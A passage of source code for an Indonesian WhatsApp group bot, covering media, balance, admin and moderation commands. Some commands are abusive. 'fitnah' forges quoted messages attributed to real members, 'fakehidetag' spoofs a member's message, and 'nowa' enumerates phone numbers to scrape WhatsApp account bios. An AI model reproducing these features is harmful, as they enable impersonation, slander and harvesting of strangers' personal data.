📛 Channel : *${v.name}*
🌀 Url : ${v.url}
👻 Subscriber : ${v.subCountLabel} (${v.subCount})
🎦 Total Video : ${v.videoCount}
`.trim()
}
}).filter(v => v).join('\n----------------------------------------\n')

juna.sendMessage(m.chat, { image: tbuff, caption: teks }, { quoted: m })

 .catch((err) => {
newReply("Not found")
})
}
break

 // Random Menu
case'cecan':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
juna.sendMessage(m.chat, { caption: "Jangan Lupa Post Sw Biar Mantan Panas Coy🥵", image: { url: `https://api.zenext.xyz/randomasupan/cecan?apikey=${setting.ZenzKey}` }}, { quoted: m })
.catch((e) => {
newReply(mess.error.api)
})
limitAdd(m.sender, limit)
}
break
case'cosplay':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
newReply(mess.wait)
juna.sendMessage(m.chat, { caption: "Wangyy Wangyy😋", image: { url: `https://api.zenext.xyz/randomimage/cosplay?apikey=${setting.ZenzKey}` }}, { quoted: m })
.catch((e) => {
newReply(mess.error.api)
})
limitAdd(m.sender, limit)
}
break
case'cogan':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
addCountCmd('#cogan', m.sender, _cmd)
var query = ["cowo korea","cowo china", "cowo Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
juna.sendMessage(m.chat, { caption: "Random Cogan", image: { url: anu }}, { quoted: m })
.catch((e) => {
newReply(mess.error.api)

})
limitAdd(m.sender, limit)
}
break
case'waifu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
addCountCmd('#waifu', m.sender, _cmd)
var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
juna.sendMessage(m.chat, { caption: "Random Waifu", image: { url: data }}, { quoted: m })
.catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(mess.error.api)

})
limitAdd(m.sender, limit)
}
break
// Balance Menu
case 'bannedfitur1':{
if(!isAdmins) return newReply('Ga usah pake fitur top global kontol males gw di tag tag in')
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup)return newReply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPGLOBAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
for (let i = 0; i < total; i ++){
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
juna.sendTextWithMentions(m.chat, top, m)
//mentions(top, arrTop, true)
}
break
case'bannedfitur2':{
if(!isAdmins) return newReply('Ga usah pake fitur top global kontol males gw di tag tag in')
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup)return newReply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPLOCAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
let anggroup = groupMembers.map(a => a.id)
for (let i = 0; i < total; i ++){
if (anggroup.includes(balance[i].id)) {
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
}
juna.sendTextWithMentions(m.chat, top, m)
}
break
case'buylimit':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = $2000 balance`)
if (text.includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(text)) return newReply(`Harus berupa angka`)
if (args[0] === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 2000)
if (getBalance(m.sender, balance) < ane) return newReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buylimit', m.sender, _cmd)
kurangBalance(m.sender, ane, balance)
giveLimit(m.sender, parseInt(text), limit)
newReply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Balance : $${getBalance(m.sender, balance)}\nSisa Limit : ${getLimit(m.sender, limitCount, limit)}/${limitCount}`)
}
break
case'buygamelimit': case'buyglimit':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *jumlah game limit yang ingin dibeli*\n\nHarga 1 game limit = $50 balance\nPajak $1 / $10`)
if (text.includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(text)) return newReply(`Harus berupa angka`)
if (text === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 50)
if (getBalance(m.sender, balance) < ane) return newReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buygamelimit', m.sender, _cmd)
kurangBalance(m.sender, ane, balance)
givegame(m.sender, parseInt(text), glimit)
newReply(`Pembeliaan game limit sebanyak ${text} berhasil\n\nSisa Balance : $${getBalance(m.sender, balance)}\nSisa Game Limit : ${cekGLimit(m.sender, gcount, glimit)}/${gcount}`)
}
break
case'transfer': case'tf':{
if (!isCreator) return newReply('This feature is currently banned temporarily due to indications of bug exploitation.\n\nFitur ini sedang di banned untuk sementara karena terindikasi adanya tindakan exploitasi bug.')
if (isCreator) return newReply('Owner dongo,udah tau fitur nya baru di benerin masih aja ketik ini komen,goblok😂😂🔪')
// if (isBan) return newReply('Lu di ban kocak awokwok') 
// if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
// let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
// if (!users) return newReply(`Tag orang yang ingin di transfer balance`)
// if (!args[1]) return newReply(`Masukkan nominal nya!`)
// if (isNaN(args[1])) return newReply(`Nominal harus berupa angka!`)
// if (args[1] === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
// if (args[1].includes("-")) return newReply(`Jangan menggunakan -`)
// var anu = getBalance(m.sender, balance)
// if (anu < args[1] || anu == 'undefined') return newReply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
// addCountCmd('#transfer', m.sender, _cmd)
// kurangBalance(m.sender, parseInt(text), balance)
// addBalance(users, parseInt(args[1]), balance)
// juna.sendTextWithMentions(m.chat, `Sukses transfer balance sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
break
case'limit': case'balance': case'ceklimit': case'cekbalance':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
/*let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users){
var Ystatus = ownerNumber.includes(users)
var isPrim = Ystatus ? true : _prem.checkPremiumUser(users, premium)
var ggcount = isPrim ? gcounti.prem : gcounti.user
var limitMen = `${getLimit(users, limitCount, limit)}`
reply(`💳 Limit : ${_prem.checkPremiumUser(users, premium) ? 'Unlimited' : limitMen}/${limitCount}\n🕹️ Limit Game : ${cekGLimit(users, ggcount, glimit)}/${ggcount}\n🏦 Balance : $${await getBalance(users, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Example :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Note :*\n• Harga 1 limit = $50 balance`)
} else {*/
var mybal = await getBalance(m.sender, balance)
var limitPrib = `${getLimit(m.sender, limitCount, limit)}/${limitCount}`
newReply(`💳 Limit : ${isPremium ? 'Unlimited' : limitPrib}\n🕹️ Limit Game : ${cekGLimit(m.sender, gcount, glimit)}/${gcount}\n🏦 Balance : $${mybal}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Example :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Note :*\n• Harga 1 limit = $2000 balance`)
// }
break
}
// Baileys
case'fitnah':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text) return juna.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix+command} *@tag|pesantarget|pesanbot*\n\n_Contoh_\n\n${prefix+command} @${m.sender.split("@")[0]}|enak ga semalem|enak banget`, m)
var org = text.split("|")[0]
var target = text.split("|")[1];
var bot = text.split("|")[2];
if (!org.startsWith('@')) return newReply('Tag orangnya')
if (!target) return newReply(`Masukkan pesan target!`)
if (!bot) return newReply(`Masukkan pesan bot!`)
var mens = parseMention(target)
addCountCmd('#fitnah', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${target}` }}
juna.sendMessage(m.chat, { text: bot, mentions: mens }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case'nowa':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *nomor*\n\n_Contoh_\n\n${prefix+command} 628XXXXXXXXXX`)
if (!text.includes('x')) return newReply('Misal 6285xxx')
newReply(mess.wait)
addCountCmd('#nowa', m.sender, _cmd)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = teks.split('x')[0]
var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
var random_length = countInstances(teks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}

var nomerny = `List Nomer\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`

for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]

var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}

var anu = await juna.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false

try {
try {
var anu1 = await juna.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
} else {
if (random_length == 6) {
var thn = `${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}`
if (thn.endsWith('2009')) {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
}
}
newReply(`${nomerny}${no_bio}${no_watsap}`)
break
case 'q': case 'quoted': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.quoted) return newReply('Reply Pesannya!!')
let gwm = await juna.serializeM(await m.getQuotedObj())
if (!gwm.quoted) return newReply('Pesan Yang anda reply tidak mengandung reply')
await gwm.quoted.copyNForward(m.chat, true)
}
break
case 'fakehidetag':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.isGroup) return newReply(mess.OnlyGrup)
if (!text) return juna.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix + command} *@tag|text*\n\n_Contoh_\n\n${prefix + command} @${m.sender.split("@")[0]}|Halo`, m)
var org = text.split("|")[0]
var teks = text.split("|")[1];
if (!org.startsWith('@')) return newReply('Tag orangnya')
var mem2 = []
groupMembers.map( i => mem2.push(i.id) )
var mens = parseMention(target)
addCountCmd('#fakehidetag', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
juna.sendMessage(m.chat, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case'react':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.quoted) return newReply(`Balas pesannya`)
if (!text) return newReply(`Masukkan 1 emoji`)
if (!isEmoji(text)) return newReply(`Itu bukan emoji!`)
if (isEmoji(text).length > 1) return newReply(`Satu aja emojinya`)
addCountCmd('#react', m.sender, _cmd)
var reactMsg = { reactionMessage: {
key: {
remoteJid: m.chat,
fromMe: m.key.fromMe,
id: quoted.id
},
text: text
}
}
juna.sendMessageFromContent(m.chat, reactMsg)
break
case 'setcmd': case 'addcmd':{
if (!m.quoted) return newReply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return newReply ('SHA256 Hash Missing')
if (!text) return newReply(`Contoh ${prefix + command} .menu`)
let hash = m.quoted.fileSha256.toString('base64')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return newReply( 'You have no permission to change this sticker command')
db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
newReply(`Done!`)
}
break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return newReply ('SHA256 Hash Missing')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return newReply( 'You have no permission to change this sticker command')
delete db.data.sticker[hash]
newReply(`Done!`)
}
break
// Owners Menu
case 'listgc': {
if (!isCreator) return newReply('Lu Siapa Kocak?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await juna.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
juna.sendTextWithMentions(m.chat, teks, m)
}
break
case 'creategc': {
if (!isCreator) return newReply('Lu Siapa Kocak?')
if (!args.join(" ")) return newReply(`Masukkan nama grup`) 
let cret = await juna.groupCreate(args.join(" "), [])
let response = await juna.groupInviteCode(cret.id)
teks = `「 Group Create Fitur 」

༫ Subject Group : ${cret.subject}
༫ Owner Group : @${cret.owner.split("@")[0]}
༫ Creation Group : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

⌞ ʟɪɴᴋ ɢʀᴏᴜᴘ ⌝
https://chat.whatsapp.com/${response}
`
juna.sendMessage(m.chat, {text: teks,mentions: parseMention(teks)}, {quoted: m})
await sleep(500)
juna.sendMessage(`${groupMetadata.id}`, { text: 'Welcome to the new group members hehe' })
}
break
case 'joingc': case'join': {
if (!isCreator) return newReply(`Mau sewa bot buat jaga gc? silahkan hubungi owner`)
if (!text) return newReply(`Kirim perintah ${prefix + command} _linkgrup_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply(mess.error.Iv)
newReply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await juna.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
}
break
case 'leavegc': {
if (!isCreator) return newReply(mess.OnlyOwner)
await juna.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
}
break
case 'public': {
if (!isCreator) return newReply(mess.OnlyOwner)
juna.public = true
newReply('Sukses Change To Public Mode')
}
break
case 'self': {
if (!isCreator) return newReply(mess.OnlyOwner)
juna.public = false
newReply('Sukses Change To Self Mode')
}
break
case 'banuser': case 'banneduser': {
if (!isCreator) return newReply('Khusus Owner')
let who
try {
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
} catch (err) {
if (m.isGroup) who = text + "@s.whatsapp.net"
}
if (!who) return newReply('Tag/reply number to banned')
const isBen = user_ban.includes(who)
if (isBen) return newReply(`${isBen} Already on the Banned list !!`)
				
user_ban.push(who)
fs.writeFileSync('./database/banned.json', JSON.stringify(user_ban, 2, null))
await sleep(500)
newReply(who + '\nMampus di banned bot kgk bisa akses fitur bot lagi')
}
break 
case 'unbanneduser': case 'unbanuser':{
if (!isCreator) return newReply('Khusus Owner!') 
let whe
try {
if (m.isGroup) whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
} catch (err) {
if (m.isGroup) whe = text + "@s.whatsapp.net"
}
if (!whe) return newReply('Tag/reply number to unban')
user_ban.splice(whe, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(user_ban, 2, null))
await sleep(500)
newReply(whe + '\nHuft untung lu di Unbanned jdi bisa akses fitur bot lagi:v')
}
break
case 'listban': case 'listbanned':{
var textban = `_*List User Yang Terbanned Di Database :*_ *${user_ban.length}*`
await juna.sendMessage(m.chat, {
text: textban,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'block': case 'blok':
if (!isCreator) return newReply(mess.OnlyOwner) 
if (!text) return newReply(`Masukkan nomor target!`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
juna.updateBlockStatus(blok, 'block')
newReply(`Sukses block @${blok.split('@')[0]}`)
break
case 'unblock': case 'unblok':
if (!isCreator) return newReply(mess.OnlyOwner) 
if (!text) return newReply(`Masukkan nomor target!`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
juna.updateBlockStatus(unblok, 'unblock')
newReply(`Sukses unblock @${unblok.split('@')[0]}`)
break
case 'listblock': case 'listblok':
let listblok = await juna.fetchBlocklist()
newReply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
break
case 'sampah':
if (!isCreator) return newReply(mess.OnlyOwner)
let all = await fs.readdirSync('./sticker')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(o=>`${o}\n`).join("");
newReply(teks)
break
case 'delsampah':{
if (!isCreator) return newReply(mess.OnlyOwner)
let directoryPath = path.join('./sticker') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return newReply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return newReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
newReply(teks)
await sleep(2000)
newReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sticker/${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
newReply("Berhasil menghapus semua sampah")
});
}
break
case 'sampah2':
if (!isCreator) return newReply(mess.OnlyOwner)
let fl = await fs.readdirSync('./')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("mp3")).map(v=>v).length} Sampah\n\n`
teks += fl.filter(v => v.endsWith("mp3")).map(o=>`${o}\n`).join("");
newReply(teks)
break
case 'delsampah2':{
if (!isCreator) return newReply(mess.OnlyOwner)
let directoryPath = path.join('./') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return newReply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("mp3"))
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return newReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
newReply(teks)
await sleep(2000)
newReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
newReply("Berhasil menghapus semua sampah")
});
}
break
case 'setppbot': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
await juna.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
newReply("Done")
}
break
case'nsfw':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === 'on') {
if (isNsfw) return newReply("Udh on di group ini")
_nsfw.push(m.chat)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
newReply("Nsfw berhasil di aktifkan di group ini")
} else if (args[0] === 'off') {
if (!isNsfw) return newReply("Udh off di group ini")
_nsfw.splice(m.chat, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
newReply("Nsfw berhasil di nonaktifkan di group ini")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case'autobio': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autobio === true) return newReply("Udh on")
setting.autobio = true
newReply("Autobio berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autobio === false) return newReply("Udh off")
setting.autobio = false
newReply("Autobio berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'anticall': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.anticall === true) return newReply("Udh on")
setting.anticall = true
newReply("Anticall berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.anticall === false) return newReply("Udh off")
setting.anticall = false
newReply("Anticall berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autorespond': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autorespond === true) return newReply("Udh on")
setting.autorespond = true
newReply("Autorespond berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autorespond === false) return newReply("Udh off")
setting.autorespond = false
newReply("Autorespond berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoblok': case 'autoblok212': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoblok212 === true) return newReply("Udh on")
setting.autoblok212 = true
newReply("Autoblok berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoblok212 === false) return newReply("Udh off")
setting.autoblok212 = false
newReply("Autoblok berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'autoread': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoread === true) return newReply("Udh on")
setting.autoread = true
newReply("Autoread berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoread === false) return newReply("Udh off")
setting.autoread = false
newReply("Autoread berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'addstiker': case 'addsticker': case 'addstik':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/webp/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
setiker.push(`${text}`)
fs.writeFileSync(`./database/${text}.webp`, media)
fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))
newReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break
case 'liststik': case 'liststiker': case 'liststc':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
teks = '*STICKER LIST :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_`
newReply(teks)
break
}
case 'addfoto': case 'addimage': case 'addphoto': case 'addimg':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/image/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
imagenye.push(`${text}`)
fs.writeFileSync(`./database/${text}.jpg`, media)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
newReply(`Sukses Menambahkan Image\nCek dengan cara ${prefix}listimg`)
}
break
case 'listimage': case 'imagelist': case 'listimg':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
teks = '*IMAGE LIST :*\n\n'
for (let awokwkwk of imagenye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil image silahkan kirim pesan sesuai list image di atas_`
newReply(teks)
break
}
case 'addvideo': case 'addvidio': case 'addvid':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/video/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return newReply('Maksimal 30 detik')
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
videonye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp4`, media)
fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
newReply(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`)
}
break
case 'videolist': case 'listvidio': case 'listvid': case 'listvideo':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
teks = '*VIDEO LIST :*\n\n'
for (let awokwkwk of videonye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonye.length}*\n\n_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_`
newReply(teks)
break
}
case 'addaud': case 'addaudio': case 'addvn':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return newReply('Maksimal 30 detik')
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await juna.downloadMediaMessage(quoted)
audionye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp3`, media)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
